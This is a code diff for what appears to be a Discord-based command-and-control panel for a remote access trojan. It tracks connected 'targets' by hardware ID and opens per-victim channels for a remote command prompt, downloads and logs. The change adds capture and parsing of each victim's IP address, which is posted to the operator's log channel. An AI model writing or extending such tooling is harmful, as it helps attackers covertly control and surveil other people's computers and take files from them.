@@ -1,6 +1,6 @@
 from time import time
 from discord.ext import commands
-from src.modules.socket_server import list_connections, get_target, send_target_commands, get_hwid 
+from src.modules.socket_server import list_connections, get_target, target_info, send_target_commands, parse_target_ip
 
 CONNECTED = []
 HWID = []
@@ -38,16 +38,18 @@ class Connections(commands.Cog):
             if CONNECTED is None:
                 await ctx.send(f"[!] No connection made")
                 return
-            hwid = get_hwid(conn)
+            hwid, target_ip = target_info(conn)
             guild_categories = ctx.guild.categories
             if hwid not in str(guild_categories):
+                target_ip_info = parse_target_ip(target_ip)
                 new_category = await ctx.guild.create_category(hwid)
-                category_id = new_category.id 
+                category_id = new_category.id
+
                 terminal_channel = await ctx.guild.create_text_channel(name='command-prompt', category=self.bot.get_channel(category_id))
                 downloads_channel = await ctx.guild.create_text_channel(name='downloads', category=self.bot.get_channel(category_id))
                 logs_channel = await ctx.guild.create_text_channel(name='logs', category=self.bot.get_channel(category_id))
-                print(terminal_channel)
-                await logs_channel.send(f"{ctx.author.mention}\n[*] Connected to: {CONNECTED}")
+
+                await logs_channel.send(f"{ctx.author.mention}\n[*] Connected to: {CONNECTED}\n IP: {target_ip_info}")
             else:
                 await ctx.send(f"[*] Connected to: {CONNECTED}")
         except Exception:
